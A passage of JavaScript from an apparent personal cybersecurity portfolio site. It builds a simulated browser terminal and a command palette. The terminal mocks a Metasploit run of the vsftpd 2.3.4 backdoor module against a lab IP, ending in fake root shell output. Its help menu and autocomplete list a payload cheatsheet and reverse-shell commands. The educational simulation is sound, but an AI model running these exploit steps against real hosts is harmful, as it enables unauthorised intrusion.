---------------------------------------------------+---------------------------------
              </div>
            </div>
          `;
        }

        case 'msfconsole':
        case 'metasploit': {
          return `
            <div class="p-3 rounded bg-canvas-base border border-danger-critical/50 text-xs font-mono space-y-2">
              <div class="text-danger-critical font-bold whitespace-pre leading-none text-[10px]">
  + -- --=[ metasploit v6.3.55-dev-                     ]
  + -- --=[ 2382 exploits - 1234 auxiliary - 418 post    ]
  + -- --=[ 1391 payloads - 46 encoders - 11 nops       ]
              </div>
              <div class="text-primary font-bold">msf6 &gt;</div>
              <div class="text-outline text-[11px]">Type <code class="text-secondary font-bold">use exploit/unix/ftp/vsftpd_234_backdoor</code> to select the exploit module.</div>
            </div>
          `;
        }

        // =====================================================================
        // GENERAL SYSTEM UTILITIES
        // =====================================================================
        case 'whoami':
        case 'id':
          return `
            <div class="p-2.5 rounded bg-canvas-base border border-border-hairline space-y-1 text-xs">
              <div class="text-primary font-bold text-sm">Mihraj Mashhoor K</div>
              <div class="text-on-surface">B.Tech Cybersecurity Undergraduate · Offensive Security Practitioner &amp; Local AI Researcher</div>
              <div class="text-secondary text-[11px]">TryHackMe Top 2% Globally (140+ Rooms Completed) · Google Cybersecurity Professional</div>
              <div class="text-outline text-[11px]">Specializations: Network Reconnaissance, Web Application Auditing, Local LLM Tool Integration &amp; Persistent Memory Architectures.</div>
            </div>
          `;

        case 'skills':
          return `
            <div class="space-y-1.5 my-1 text-xs">
              <div><span class="text-primary font-bold">Recon &amp; Web Security:</span> Nmap, Burp Suite, ffuf, OWASP Top 10, SQLi, XSS, Parameter Fuzzing</div>
              <div><span class="text-secondary font-bold">Password &amp; System:</span> Hydra, Hashcat, John the Ripper, SUID PrivEsc, Metasploit Framework</div>
              <div><span class="text-primary font-bold">Local AI &amp; Agents:</span> Ollama, Qwen3-Coder 30B, Gemma4:12b, nomic-embed-text, OpenCode Plugins</div>
              <div><span class="text-on-surface font-bold">Programming &amp; Storage:</span> Python 3, TypeScript, Bash Automation, SQLite 3, ChromaDB, C (Fundamentals)</div>
            </div>
          `;

        case 'projects':
          return `
            <div class="text-secondary font-bold my-1 text-xs">Engineered Technical Case Studies (Click to inspect):</div>
            <ol class="space-y-1 list-decimal list-inside text-[11px]">
              <li><a href="${root}projects/sentinelai.html" class="text-primary hover:underline font-bold">SentinelAI</a> - Vulnerability Intelligence &amp; Knowledge Platform</li>
              <li><a href="${root}projects/autonomous-pentesting-agent.html" class="text-secondary hover:underline font-bold">Autonomous Pentesting Agent</a> - Multi-Agent Authorized Security Testing</li>
              <li><a href="${root}projects/cyberai.html" class="text-primary hover:underline font-bold">CyberAI</a> - Local AI Cybersecurity Agent Platform</li>
              <li><a href="${root}projects/opencode-persistent-memory.html" class="text-secondary hover:underline font-bold">OpenCode Persistent Memory</a> - Source-Verified Dual-Engine Retrieval</li>
              <li><a href="${root}projects/local-ai-compute-stack.html" class="text-on-surface hover:underline font-bold">Local AI Compute Stack</a> - On-Premises Private Inference</li>
              <li><a href="${root}projects/ai-application-platform.html" class="text-primary hover:underline font-bold">AI Application Platform</a> - Full-Stack AI Ecosystem</li>
              <li><a href="${root}projects/cybersecurity-handbook.html" class="text-secondary hover:underline font-bold">Cybersecurity Handbook</a> - 15-Module Knowledge Base</li>
            </ol>
          `;

        case 'tryhackme':
        case 'thm':
          return `
            <div class="p-2.5 rounded bg-canvas-base border border-secondary/40 space-y-1 text-xs">
              <div class="text-secondary font-bold">TryHackMe Competitive &amp; Lab Standing</div>
              <div>• Global Percentile: <span class="text-primary font-bold">Top 2% Globally</span></div>
              <div>• Challenge Rooms: <span class="text-primary font-bold">140+ Rooms Completed</span></div>
              <div>• Certified Tracks: <span class="text-on-surface">Pre-Security, Cyber Security 101, Jr Penetration Tester</span></div>
              <div>• Profile URL: <a href="https://tryhackme.com/p/mihrajmashoor8301" target="_blank" class="text-secondary underline">tryhackme.com/p/mihrajmashoor8301 ↗</a></div>
            </div>
          `;

        case 'contact':
          return `
            <div class="space-y-1 text-[11px] text-xs">
              <div>• Email: <a href="mailto:mihrajmashoor8301@gmail.com" class="text-primary underline">mihrajmashoor8301@gmail.com</a></div>
              <div>• GitHub: <a href="https://github.com/mihrajmashoor8301-collab" target="_blank" class="text-secondary underline">github.com/mihrajmashoor8301-collab ↗</a></div>
              <div>• Portfolio: <a href="https://endlessus.in" class="text-on-surface underline">endlessus.in</a></div>
            </div>
          `;

        case 'cve':
        case 'vuln':
          return `
            <div class="space-y-2 my-1.5 text-xs">
              <div class="p-2 rounded bg-canvas-base border border-danger-critical/40 space-y-1">
                <div class="flex items-center justify-between">
                  <span class="text-danger-critical font-bold">[CVE-2024-3094] XZ Utils Embedded Backdoor</span>
                  <span class="px-1.5 py-0.2 rounded bg-danger-critical/20 text-danger-critical text-[10px] font-bold">CVSS 10.0 CRITICAL</span>
                </div>
                <div class="text-outline text-[11px]">Vector: Upstream tarball injection targeting sshd authentication on systemd-linked systems. Triaged in authorized lab.</div>
              </div>
              <div class="p-2 rounded bg-canvas-base border border-warning/40 space-y-1">
                <div class="flex items-center justify-between">
                  <span class="text-warning font-bold">[CVE-2024-6387] regreSSHion: OpenSSH Pre-Auth RCE</span>
                  <span class="px-1.5 py-0.2 rounded bg-warning/20 text-warning text-[10px] font-bold">CVSS 8.1 HIGH</span>
                </div>
                <div class="text-outline text-[11px]">Vector: Signal handler race condition (SIGALRM) in default OpenSSH server (sshd).</div>
              </div>
            </div>
          `;

        case 'uptime':
          return `<div class="text-on-surface text-xs">system uptime: <span class="text-primary font-bold">142 days, 18:40</span>, load average: 0.12, 0.08, 0.04 (Kali Linux 6.8 / RTX 4070)</div>`;

        case 'date':
          return `<div class="text-on-surface text-xs">${new Date().toUTCString()} (Host: sec-station-local)</div>`;

        case 'echo':
          return `<div class="text-on-surface font-mono text-xs">${escapeHtml(parts.slice(1).join(' '))}</div>`;

        case 'theme': {
          const validThemes = {
            'emerald': '#4EDEA3',
            'green': '#4EDEA3',
            'cyan': '#4CD7F6',
            'blue': '#4CD7F6',
            'amber': '#F59E0B',
            'orange': '#F59E0B',
            'rose': '#F43F5E',
            'red': '#F43F5E',
            'purple': '#A855F7',
            'reset': '#4EDEA3',
            'default': '#4EDEA3'
          };
          const targetTheme = arg1.toLowerCase();
          if (!targetTheme || !validThemes[targetTheme]) {
            return `
              <div class="text-outline my-1 text-xs">Usage: theme &lt;color&gt; (emerald, cyan, amber, rose, purple, reset)</div>
            `;
          }
          const color = validThemes[targetTheme];
          let styleTag = document.getElementById('dynamic-theme-override');
          if (!styleTag) {
            styleTag = document.createElement('style');
            styleTag.id = 'dynamic-theme-override';
            document.head.appendChild(styleTag);
          }
          styleTag.innerHTML = `
            :root { --primary-accent: ${color} !important; }
            .text-primary, [class*="text-primary"] { color: ${color} !important; }
            .border-primary, [class*="border-primary"] { border-color: ${color} !important; }
            .bg-primary, .bg-primary-container { background-color: ${color} !important; }
            #reading-progress-bar { background: linear-gradient(90deg, ${color}, #4CD7F6) !important; }
          `;
          if (window.showToast) window.showToast(`Theme updated to ${targetTheme.toUpperCase()}`, 'success');
          return `<div class="text-primary font-bold text-xs">Theme accent updated to: ${targetTheme.toUpperCase()} (${color})</div>`;
        }

        case 'tools':
        case 'toolkit':
          return `
            <div class="space-y-2 text-xs">
              <div class="text-primary font-bold">Interactive Security Toolkit &amp; Tools Database:</div>
              <div class="text-on-surface-variant font-sans text-xs">13 in-browser client-side utilities + 20 tool reference manuals + Nmap Builder.</div>
              <div class="grid grid-cols-2 gap-2 text-[11px] text-on-surface font-mono pt-1">
                <div>&bull; JWT Inspector &amp; Claims Analyzer</div>
                <div>&bull; CIDR &amp; Subnet Calculator</div>
                <div>&bull; Hash Identifier &amp; Mode Mapper</div>
                <div>&bull; HTTP Security Header Evaluator</div>
                <div>&bull; CSP Analyzer &amp; Directives Audit</div>
                <div>&bull; Password Entropy Estimator</div>
              </div>
              <div class="pt-1"><a href="${root}tools.html" class="text-secondary underline font-bold">&rarr; Launch Full Security Toolkit &amp; DB (tools.html)</a></div>
            </div>
          `;

        case 'labs':
        case 'lab':
          return `
            <div class="space-y-2 text-xs">
              <div class="text-primary font-bold">Practical Cybersecurity Labs Hub (12 Self-Contained Labs):</div>
              <div class="grid grid-cols-2 sm:grid-cols-3 gap-1.5 text-[11px] font-mono pt-1">
                <div><span class="text-secondary">01.</span> HTTP Headers</div>
                <div><span class="text-secondary">02.</span> Linux Permissions</div>
                <div><span class="text-danger-critical">03.</span> SUID PrivEsc</div>
                <div><span class="text-warning">04.</span> Authentication</div>
                <div><span class="text-warning">05.</span> IDOR / Authz</div>
                <div><span class="text-danger-critical">06.</span> SQL Injection</div>
                <div><span class="text-secondary">07.</span> XSS Concepts</div>
                <div><span class="text-secondary">08.</span> CSRF Tokens</div>
                <div><span class="text-primary">09.</span> Network Enum</div>
                <div><span class="text-primary">10.</span> Log Forensics</div>
                <div><span class="text-warning">11.</span> JWT Security</div>
                <div><span class="text-secondary">12.</span> Cryptography</div>
              </div>
              <div class="pt-1"><a href="${root}labs.html" class="text-primary underline font-bold">&rarr; Open Interactive Labs Hub (labs.html)</a></div>
            </div>
          `;

        case 'learning':
          return `
            <div class="space-y-2 text-xs">
              <div class="text-primary font-bold">Cybersecurity Learning Hub (12 Disciplines):</div>
              <div class="text-on-surface-variant font-sans text-xs">Structured theory, practical examples, commands, detection, defense, and labs across: Networking, Linux, Web, Recon, Enum, PrivEsc, Auth, Wireless, Cloud, Docker, OSINT, and Tools.</div>
              <div class="pt-1"><a href="${root}learning.html" class="text-primary underline font-bold">&rarr; Explore Learning Hub (learning.html)</a></div>
            </div>
          `;

        case 'methodology':
          return `
            <div class="space-y-2 text-xs">
              <div class="text-primary font-bold">12-Stage Penetration Testing Methodology &amp; Vuln Matrix:</div>
              <div class="text-[11px] font-mono text-outline">Scope &rarr; Recon &rarr; Enum &rarr; Vuln &rarr; PoC &rarr; Exploit &rarr; PrivEsc &rarr; Post &rarr; Evidence &rarr; Report &rarr; Remediate &rarr; Retest</div>
              <div class="pt-1"><a href="${root}methodology.html" class="text-secondary underline font-bold">&rarr; View Pentest Methodology &amp; Attack Matrix (methodology.html)</a></div>
            </div>
          `;

        case 'glossary':
          return `
            <div class="space-y-2 text-xs">
              <div class="text-primary font-bold">Cybersecurity Terminology &amp; Standards Glossary:</div>
              <div class="text-on-surface-variant font-sans text-xs">60+ searchable definitions covering CIA Triad, CVE, CVSS, XSS, SUID, JWT, TLS, CIDR, SIEM, and SOC metrics.</div>
              <div class="pt-1"><a href="${root}glossary.html" class="text-primary underline font-bold">&rarr; Search Glossary (glossary.html)</a></div>
            </div>
          `;

        case 'roadmap':
          return `
            <div class="space-y-2 text-xs">
              <div class="text-primary font-bold">Interactive Cybersecurity Roadmap Tracker:</div>
              <div class="text-on-surface-variant font-sans text-xs">Track progress across 11 disciplines (Networking, Linux, Programming, Web, Recon, Enum, Pentest, PrivEsc, AD, Cloud, Defense) using localStorage.</div>
              <div class="pt-1"><a href="${root}roadmap.html" class="text-primary underline font-bold">&rarr; Open Roadmap Tracker (roadmap.html)</a></div>
            </div>
          `;

        case 'help':
          return `
            <div class="space-y-2 text-xs">
              <div class="text-outline font-bold">Available Sandbox Commands:</div>
              <div class="grid grid-cols-2 sm:grid-cols-3 gap-2 text-on-surface font-mono text-[11px]">
                <div><span class="text-primary font-bold">learning</span> - 12-domain learning hub</div>
                <div><span class="text-primary font-bold">labs</span> - 12 safe interactive labs</div>
                <div><span class="text-primary font-bold">tools</span> - In-browser security suite</div>
                <div><span class="text-secondary font-bold">methodology</span> - 12-stage pentest pipeline</div>
                <div><span class="text-primary font-bold">roadmap</span> - Interactive skill tracker</div>
                <div><span class="text-primary font-bold">glossary</span> - 60+ security definitions</div>
                <div><span class="text-danger-critical font-bold">payloads</span> - RCE, CMDi &amp; LFI cheatsheet</div>
                <div><span class="text-primary font-bold">nmap</span> - Port &amp; service scanner</div>
                <div><span class="text-warning font-bold">gobuster</span> - Web directory fuzzer</div>
                <div><span class="text-warning font-bold">hydra</span> - Network login cracker</div>
                <div><span class="text-warning font-bold">hashcat</span> - GPU password cracker</div>
                <div><span class="text-danger-critical font-bold">sqlmap</span> - SQL injection tester</div>
                <div><span class="text-danger-critical font-bold">msfconsole</span> - Metasploit framework</div>
                <div><span class="text-secondary font-bold">searchsploit</span> - Exploit-DB query</div>
                <div><span class="text-secondary font-bold">nc</span> - Netcat reverse listener</div>
                <div><span class="text-on-surface font-bold">ls / cat / grep</span> - Linux file operations</div>
                <div><span class="text-on-surface font-bold">find / sudo -l</span> - Privilege escalation</div>
                <div><span class="text-primary font-bold">theme</span> - Toggle accent colors</div>
                <div><span class="text-outline font-bold">clear</span> - Clear terminal buffer</div>
              </div>
              <div class="text-outline text-[10px]">Tip: Press <kbd class="px-1 rounded bg-surface-raised border border-border-hairline">TAB</kbd> to autocomplete commands.</div>
            </div>
          `;

        default:
          return `<div class="text-danger-critical text-xs font-mono">Command not recognized: '${escapeHtml(cmd)}'. Type <span class="text-primary font-bold">help</span> or <span class="text-secondary font-bold">learn</span> for guided instructions.</div>`;
      }
    }
  };

  function handleMsfCommands(cmd) {
    if (cmd === 'use exploit/unix/ftp/vsftpd_234_backdoor' || cmd.includes('vsftpd_234')) {
      return `
        <div class="p-2 rounded bg-canvas-base border border-danger-critical/40 space-y-1 text-xs font-mono">
          <div class="text-danger-critical">[*] Using configured payload cmd/unix/interact</div>
          <div class="text-on-surface">msf6 exploit(unix/ftp/vsftpd_234_backdoor) &gt;</div>
          <div class="text-outline text-[11px]">Type <code class="text-secondary font-bold">set RHOSTS 10.10.110.45</code> then <code class="text-primary font-bold">exploit</code></div>
        </div>
      `;
    }
    if (cmd.startsWith('set rhosts') || cmd.startsWith('set rhost')) {
      return `
        <div class="font-mono text-xs text-on-surface">
          RHOSTS =&gt; 10.10.110.45<br/>
          <span class="text-outline text-[11px]">Ready. Type <code class="text-primary font-bold">exploit</code> or <code class="text-primary font-bold">run</code></span>
        </div>
      `;
    }
    if (cmd === 'exploit' || cmd === 'run') {
      return `
        <div class="p-2.5 rounded bg-canvas-base border border-primary/50 text-xs font-mono space-y-1">
          <div class="text-outline">[*] 10.10.110.45:21 - Banner: 220 (vsFTPd 2.3.4)</div>
          <div class="text-outline">[*] 10.10.110.45:21 - USER: sending smiley backdoor sequence...</div>
          <div class="text-primary font-bold">[+] 10.10.110.45:21 - Backdoor service spawned on port 6200!</div>
          <div class="text-primary font-bold">[*] Command shell session 1 opened (10.10.14.23:41204 -&gt; 10.10.110.45:6200)</div>
          <div class="p-2 rounded bg-surface-raised border border-border-hairline text-[11px] space-y-0.5 mt-2">
            <div class="text-on-surface font-bold">id</div>
            <div class="text-secondary font-bold">uid=0(root) gid=0(root) groups=0(root)</div>
          </div>
          <div class="text-outline text-[10px] mt-1">Simulated root access verified in educational scope.</div>
        </div>
      `;
    }
    return `<div class="text-danger-critical text-xs font-mono">msf6 &gt; Unknown framework directive: '${escapeHtml(cmd)}'</div>`;
  }

  window.cyberCommandEngine = CyberCommandEngine;

  // =========================================================================
  // 6. COMMAND PALETTE MODAL
  // =========================================================================
  function initCommandPalette() {
    const paletteHtml = `
      <div id="cmd-palette" class="fixed inset-0 z-[100] hidden items-start justify-center pt-16 sm:pt-24 px-4 bg-canvas-base/80 backdrop-blur-md transition-opacity">
        <div class="w-full max-w-2xl rounded-2xl bg-surface-subtle border border-primary/40 shadow-[0_0_50px_rgba(78,222,163,0.15)] overflow-hidden flex flex-col max-h-[80vh]">
          <!-- Input Header -->
          <div class="flex items-center gap-3 px-4 py-3.5 border-b border-border-hairline bg-surface-raised">
            <span class="material-symbols-outlined text-primary text-xl">search</span>
            <input id="cmd-palette-input" type="text" placeholder="Type a command, project, tool, or section... (ESC to exit)" 
                   class="w-full bg-transparent border-0 outline-none text-on-surface font-mono text-sm placeholder:text-outline focus:ring-0 focus:outline-none"
                   autocomplete="off" spellcheck="false" />
            <span class="px-2 py-0.5 rounded bg-canvas-base border border-border-hairline font-mono text-[10px] text-outline">ESC</span>
          </div>
          <!-- Results List -->
          <div id="cmd-palette-results" class="overflow-y-auto p-2 space-y-1 divide-y divide-border-hairline/40 font-mono text-xs"></div>
          <!-- Footer -->
          <div class="px-4 py-2 border-t border-border-hairline bg-surface-raised/50 flex flex-wrap items-center justify-between text-[11px] font-mono text-outline">
            <div class="flex items-center gap-3">
              <span><kbd class="px-1.5 py-0.5 rounded bg-canvas-base border border-border-hairline text-on-surface">↑↓</kbd> Navigate</span>
              <span><kbd class="px-1.5 py-0.5 rounded bg-canvas-base border border-border-hairline text-on-surface">↵</kbd> Select</span>
            </div>
            <span>Mihraj Mashhoor K · Portfolio Search</span>
          </div>
        </div>
      </div>
    `;

    document.body.insertAdjacentHTML('beforeend', paletteHtml);

    const palette = document.getElementById('cmd-palette');
    const input = document.getElementById('cmd-palette-input');
    const resultsContainer = document.getElementById('cmd-palette-results');
    let selectedIndex = 0;
    let filteredItems = [];

    function renderResults(query = '') {
      const q = query.trim().toLowerCase();
      filteredItems = SEARCH_ITEMS.filter(item => {
        if (!q) return true;
        return item.title.toLowerCase().includes(q) ||
               item.desc.toLowerCase().includes(q) ||
               item.type.toLowerCase().includes(q) ||
               item.keywords.toLowerCase().includes(q);
      });

      if (filteredItems.length === 0) {
        resultsContainer.innerHTML = `
          <div class="p-6 text-center text-outline">
            <span class="material-symbols-outlined text-2xl text-secondary mb-1">search_off</span>
            <div>No matching security assets or sections found for "${escapeHtml(query)}"</div>
          </div>
        `;
        return;
      }

      selectedIndex = 0;
      resultsContainer.innerHTML = filteredItems.map((item, idx) => {
        const typeBadge = {
          'SANDBOX': 'text-primary border-primary/50 bg-primary/20 font-bold',
          'CASE STUDY': 'text-primary border-primary/30 bg-primary/10',
          'PAGE': 'text-secondary border-secondary/30 bg-secondary/10',
          'SECTION': 'text-on-surface border-border-hairline bg-canvas-base',
          'MODULE': 'text-warning border-warning/30 bg-warning/10',
          'KNOWLEDGE BASE': 'text-secondary border-secondary/30 bg-secondary/10',
          'ACTION': 'text-primary border-primary/40 bg-canvas-base font-bold',
          'EXTERNAL': 'text-outline border-border-hairline bg-canvas-base'
        }[item.type] || 'text-outline border-border-hairline bg-canvas-base';

        return `
          <div class="cmd-item p-3 rounded-xl flex items-center justify-between gap-3 cursor-pointer transition-colors ${idx === 0 ? 'bg-surface-raised border border-primary/40 text-on-surface' : 'hover:bg-surface-raised text-on-surface-variant'}"
               data-index="${idx}">
            <div class="flex items-center gap-2.5 min-w-0">
              <span class="material-symbols-outlined text-sm text-outline shrink-0">
                ${item.type === 'SANDBOX' ? 'terminal' : item.type === 'CASE STUDY' ? 'schema' : item.type === 'MODULE' || item.type === 'KNOWLEDGE BASE' ? 'menu_book' : item.type === 'ACTION' ? 'play_arrow' : 'arrow_right_alt'}
              </span>
              <div class="truncate">
                <div class="font-bold text-on-surface truncate">${item.title}</div>
                <div class="text-[11px] text-outline truncate">${item.desc}</div>
              </div>
            </div>
            <span class="px-2 py-0.5 rounded border text-[9px] font-mono shrink-0 uppercase tracking-wider ${typeBadge}">
              ${item.type}
            </span>
          </div>
        `;
      }).join('');

      resultsContainer.querySelectorAll('.cmd-item').forEach(el => {
        el.addEventListener('click', () => {
          const idx = parseInt(el.getAttribute('data-index'), 10);
          selectItem(filteredItems[idx]);
        });
      });
    }

    function selectItem(item) {
      if (!item) return;
      closePalette();
      if (item.action === 'terminal') {
        openTerminal();
      } else if (item.url) {
        if (item.url.startsWith('http')) {
          window.open(item.url, '_blank', 'noopener,noreferrer');
        } else {
          window.location.href = item.url;
        }
      }
    }

    function openPalette() {
      palette.classList.remove('hidden');
      palette.classList.add('flex');
      input.value = '';
      renderResults('');
      setTimeout(() => input.focus(), 50);
    }

    function closePalette() {
      palette.classList.remove('flex');
      palette.classList.add('hidden');
    }

    input.addEventListener('input', (e) => renderResults(e.target.value));

    input.addEventListener('keydown', (e) => {
      const items = resultsContainer.querySelectorAll('.cmd-item');
      if (e.key === 'ArrowDown') {
        e.preventDefault();
        if (items.length > 0) {
          items[selectedIndex]?.classList.remove('bg-surface-raised', 'border', 'border-primary/40');
          selectedIndex = (selectedIndex + 1) % items.length;
          items[selectedIndex]?.classList.add('bg-surface-raised', 'border', 'border-primary/40');
          items[selectedIndex]?.scrollIntoView({ block: 'nearest' });
        }
      } else if (e.key === 'ArrowUp') {
        e.preventDefault();
        if (items.length > 0) {
          items[selectedIndex]?.classList.remove('bg-surface-raised', 'border', 'border-primary/40');
          selectedIndex = (selectedIndex - 1 + items.length) % items.length;
          items[selectedIndex]?.classList.add('bg-surface-raised', 'border', 'border-primary/40');
          items[selectedIndex]?.scrollIntoView({ block: 'nearest' });
        }
      } else if (e.key === 'Enter') {
        e.preventDefault();
        if (filteredItems[selectedIndex]) {
          selectItem(filteredItems[selectedIndex]);
        }
      } else if (e.key === 'Escape') {
        closePalette();
      }
    });

    palette.addEventListener('click', (e) => {
      if (e.target === palette) closePalette();
    });

    window.addEventListener('keydown', (e) => {
      if ((e.metaKey || e.ctrlKey) && e.key.toLowerCase() === 'k') {
        e.preventDefault();
        palette.classList.contains('hidden') ? openPalette() : closePalette();
      } else if (e.key === '/' && document.activeElement.tagName !== 'INPUT' && document.activeElement.tagName !== 'TEXTAREA') {
        e.preventDefault();
        openPalette();
      } else if (e.key === 'Escape' && !palette.classList.contains('hidden')) {
        closePalette();
      }
    });

    window.openCommandPalette = openPalette;

    document.addEventListener('click', (e) => {
      const cmdBtn = e.target.closest('[data-trigger-cmd]');
      if (cmdBtn) {
        e.preventDefault();
        openPalette();
      }
    });
  }

  // =========================================================================
  // 7. SUPERCHARGED CYBER TERMINAL EMULATOR (GLOBAL POPUP)
  // =========================================================================
  function initCyberTerminal() {
    const terminalHtml = `
      <div id="cyber-terminal-modal" class="fixed inset-0 z-[110] hidden items-center justify-center p-3 sm:p-4 bg-canvas-base/85 backdrop-blur-md">
        <div class="w-full max-w-3xl h-[530px] rounded-2xl bg-surface-subtle border border-primary/50 shadow-[0_0_60px_rgba(78,222,163,0.25)] flex flex-col overflow-hidden font-mono text-xs">
          <!-- Terminal Title Bar -->
          <div class="flex items-center justify-between px-4 py-2.5 bg-surface-raised border-b border-border-hairline select-none">
            <div class="flex items-center gap-2">
              <span class="w-3 h-3 rounded-full bg-danger-critical inline-block cursor-pointer hover:opacity-80" id="term-close-btn" title="Close Terminal"></span>
              <span class="w-3 h-3 rounded-full bg-warning inline-block opacity-75" title="Minimize"></span>
              <span class="w-3 h-3 rounded-full bg-primary inline-block opacity-75" title="Maximize"></span>
              <span class="text-on-surface text-xs font-bold ml-2 flex items-center gap-1.5">
                <span class="material-symbols-outlined text-sm text-primary">terminal</span>
                <span>endlessus-term v4.0.0 · guest@sec-station:~/lab$</span>
              </span>
            </div>
            <div class="flex items-center gap-2 text-[10px] text-outline">
              <a href="${root}terminal-lab.html" class="hidden sm:inline text-secondary hover:underline font-bold mr-2">Full Lab Workstation ↗</a>
              <span class="hidden sm:inline">Press <kbd class="px-1 rounded bg-canvas-base border border-border-hairline">TAB</kbd> autocomplete ·</span>
              <span><kbd class="px-1 rounded bg-canvas-base border border-border-hairline">~</kbd> or <kbd class="px-1 rounded bg-canvas-base border border-border-hairline">ESC</kbd> exit</span>
            </div>
          </div>
          <!-- Terminal Output Screen -->
          <div id="terminal-output" class="flex-1 overflow-y-auto p-4 space-y-2 text-on-surface-variant leading-relaxed">
            <div class="text-primary font-bold">
              ════════════════════════════════════════════════════════════════════════════════════<br/>
              &nbsp;&nbsp;MIHRAJ MASHOOR K // OFFENSIVE SECURITY &amp; LOCAL AI RESEARCH MAINFRAME<br/>
              &nbsp;&nbsp;TRYHACKME TOP 2% GLOBALLY (140+ ROOMS) · GOOGLE CYBERSECURITY CERTIFIED<br/>
              ════════════════════════════════════════════════════════════════════════════════════
            </div>
            <div class="text-outline">
              Type <span class="text-primary font-bold">learn</span> for guided lessons, <span class="text-secondary font-bold">targets</span> for lab IPs, <span class="text-primary font-bold">nmap 10.10.110.45</span> for network recon, or <span class="text-primary font-bold">matrix</span> for digital rain.
            </div>
          </div>
          <!-- Terminal Input Row -->
          <div class="flex items-center gap-2 px-4 py-3 bg-canvas-base border-t border-border-hairline">
            <span class="text-primary font-bold select-none shrink-0">guest@sec-station:~/lab$</span>
            <input id="terminal-input" type="text" 
                   class="flex-1 bg-transparent border-0 outline-none text-on-surface font-mono text-xs focus:ring-0 focus:outline-none"
                   autocomplete="off" spellcheck="false" autofocus />
          </div>
        </div>
      </div>
    `;

    document.body.insertAdjacentHTML('beforeend', terminalHtml);

    const termModal = document.getElementById('cyber-terminal-modal');
    const termInput = document.getElementById('terminal-input');
    const termOutput = document.getElementById('terminal-output');
    const closeBtn = document.getElementById('term-close-btn');

    let history = [];
    let historyIndex = -1;
    let matrixInterval = null;
    let matrixCanvas = null;

    const AUTOCOMPLETE_COMMANDS = [
      'help', 'payloads', 'rce', 'lfi', 'revshell', 'roadmap', 'learn', 'targets', 'cheatsheet', 'whoami', 'skills', 'projects', 'tryhackme', 'cat resume',
      'ls', 'pwd', 'cd', 'cat', 'grep', 'find', 'chmod', 'ps', 'uname', 'ifconfig', 'df', 'free', 'history',
      'nmap', 'gobuster', 'ffuf', 'hydra', 'hashcat', 'john', 'sqlmap', 'nc', 'searchsploit', 'msfconsole',
      'matrix', 'theme', 'uptime', 'date', 'sudo', 'echo', 'clear', 'exit'
    ];

    function stopMatrixRain() {
      if (matrixInterval) {
        clearInterval(matrixInterval);
        matrixInterval = null;
      }
      if (matrixCanvas) {
        matrixCanvas = null;
      }
    }

    function startMatrixRain() {
      stopMatrixRain();
      appendOutput(`
        <div class="p-2 rounded bg-canvas-base border border-primary/50 relative overflow-hidden my-2" id="matrix-container" style="height: 220px;">
          <canvas id="matrix-canvas" style="position: absolute; inset: 0; width: 100%; height: 100%; display: block;"></canvas>
          <div style="position: absolute; top: 8px; right: 10px; z-index: 10; font-size: 10px; color: #4EDEA3; background: rgba(9,13,18,0.85); padding: 2px 8px; border-radius: 4px; border: 1px solid rgba(78,222,163,0.4);">
            DIGITAL RAIN ACTIVE · Type 'clear' to reset
          </div>
        </div>
      `);

      setTimeout(() => {
        const container = document.getElementById('matrix-container');
        const canvas = document.getElementById('matrix-canvas');
        if (!canvas || !container) return;
        matrixCanvas = canvas;
        const ctx = canvas.getContext('2d');
        canvas.width = container.clientWidth;
        canvas.height = container.clientHeight;

        const characters = '0101010101MIHRAJMASHOOR0123456789ABCDEF$#@%&*<>{}[]';
        const fontSize = 12;
        const columns = Math.floor(canvas.width / fontSize);
        const drops = Array(columns).fill(1);

        function draw() {
          ctx.fillStyle = 'rgba(9, 13, 18, 0.15)';
          ctx.fillRect(0, 0, canvas.width, canvas.height);

          ctx.fillStyle = '#4EDEA3';
          ctx.font = fontSize + 'px monospace';

          for (let i = 0; i < drops.length; i++) {
            const text = characters.charAt(Math.floor(Math.random() * characters.length));
            ctx.fillText(text, i * fontSize, drops[i] * fontSize);

            if (drops[i] * fontSize > canvas.height && Math.random() > 0.975) {
              drops[i] = 0;
            }
            drops[i]++;
          }
        }

        matrixInterval = setInterval(draw, 40);
      }, 60);
    }

    function appendOutput(html) {
      const line = document.createElement('div');
      line.innerHTML = html;
      termOutput.appendChild(line);
      termOutput.scrollTop = termOutput.scrollHeight;
    }

    function handleCommand(cmdRaw) {
      const cmd = cmdRaw.trim();
      if (!cmd) return;
      history.push(cmd);
      historyIndex = history.length;

      appendOutput(`<div class="flex items-center gap-2 mt-2"><span class="text-primary font-bold">guest@sec-station:~/lab$</span> <span class="text-on-surface">${escapeHtml(cmd)}</span></div>`);

      if (cmd.toLowerCase() === 'clear' || cmd.toLowerCase() === 'cls') {
        stopMatrixRain();
        termOutput.innerHTML = '';
        return;
      }

      if (cmd.toLowerCase() === 'matrix') {
        startMatrixRain();
        return;
      }

      if (cmd.toLowerCase() === 'exit' || cmd.toLowerCase() === 'quit') {
        closeTerminal();
        return;
      }

      const outputHtml = CyberCommandEngine.run(cmd);
      if (outputHtml) {
        appendOutput(outputHtml);
      }
    }

    function openTerminal() {
      termModal.classList.remove('hidden');
      termModal.classList.add('flex');
      setTimeout(() => {
        termInput.focus();
        termOutput.scrollTop = termOutput.scrollHeight;
      }, 50);
    }

    function closeTerminal() {
      stopMatrixRain();
      termModal.classList.remove('flex');
      termModal.classList.add('hidden');
    }

    closeBtn?.addEventListener('click', (e) => {
      e.stopPropagation();
      closeTerminal();
    });

    termModal.addEventListener('click', (e) => {
      if (e.target === termModal) {
        closeTerminal();
      } else {
        termInput.focus();
      }
    });

    termInput.addEventListener('keydown', (e) => {
      if (e.key === 'Enter') {
        e.preventDefault();
        handleCommand(termInput.value);
        termInput.value = '';
      } else if (e.key === 'Tab') {
        e.preventDefault();
        const current = termInput.value.trim().toLowerCase();
        if (!current) return;
        const matches = AUTOCOMPLETE_COMMANDS.filter(c => c.startsWith(current));
        if (matches.length === 1) {
          termInput.value = matches[0] + (matches[0] === 'cat resume' ? '' : ' ');
        } else if (matches.length > 1) {
          appendOutput(`<div class="text-outline text-[11px] my-1">${matches.join('&nbsp;&nbsp;&nbsp;&nbsp;')}</div>`);
          let prefix = current;
          while (true) {
            const nextChar = matches[0][prefix.length];
            if (!nextChar || !matches.every(m => m[prefix.length] === nextChar)) break;
            prefix += nextChar;
          }
          termInput.value = prefix;
        }
      } else if (e.key === 'ArrowUp') {
        e.preventDefault();
        if (history.length > 0 && historyIndex > 0) {
          historyIndex--;
          termInput.value = history[historyIndex] || '';
        }
      } else if (e.key === 'ArrowDown') {
        e.preventDefault();
        if (historyIndex < history.length - 1) {
          historyIndex++;
          termInput.value = history[historyIndex] || '';
        } else {
          historyIndex = history.length;
